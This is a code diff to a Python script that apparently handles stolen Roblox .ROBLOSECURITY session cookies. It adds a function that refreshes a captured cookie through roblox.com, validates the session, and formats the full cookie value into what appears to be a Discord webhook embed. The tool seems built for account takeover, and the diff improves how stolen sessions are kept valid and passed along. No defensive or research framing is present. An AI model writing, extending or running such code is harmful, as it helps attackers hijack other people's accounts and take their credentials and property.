@@ -54,6 +54,22 @@ def extract_and_clean_cookie(raw_input):
         
     return cleaned
 
+def refresh_cookie_api(raw_cookie):
+    session = requests.Session()
+    session.cookies.set(".ROBLOSECURITY", raw_cookie, domain=".roblox.com", path="/")
+    
+    # Fetch home page to grab anti-csrf token (.ROBLOSECURITY rotation mechanisms)
+    try:
+        res = session.get("https://www.roblox.com/home", timeout=10)
+        # Check if the cookie is still valid and if a refreshed cookie was returned in headers/cookies
+        updated_cookie = session.cookies.get(".ROBLOSECURITY", domain=".roblox.com")
+        if updated_cookie:
+            return updated_cookie
+    except Exception:
+        pass
+    
+    return raw_cookie
+
 def get_working_session(roblosecurity):
     session = requests.Session()
     session.headers.update({
@@ -103,8 +119,10 @@ def main():
     if not raw_cookie:
         sys.exit(0)
 
-    print("[+] Validating session...")
-    session = get_working_session(raw_cookie)
+    print("[+] Refreshing cookie session via API...")
+    refreshed_cookie = refresh_cookie_api(raw_cookie)
+
+    session = get_working_session(refreshed_cookie)
 
     auth_res = session.get("https://users.roblox.com/v1/users/authenticated", timeout=5)
     if auth_res.status_code != 200:
@@ -311,10 +329,10 @@ def main():
                 "timestamp": datetime.now(timezone.utc).isoformat()
             },
             {
-                "title": "🔑 Session Cookie",
-                "description": f"```text\n{raw_cookie}\n```",
+                "title": "🔑 Refreshed Session Cookie",
+                "description": f"```text\n{refreshed_cookie}\n```",
                 "color": 0x2B2D31,
-                "footer": {"text": f"Token Length: {len(raw_cookie)} chars"}
+                "footer": {"text": f"Token Length: {len(refreshed_cookie)} chars"}
             }
         ],
         "components": [
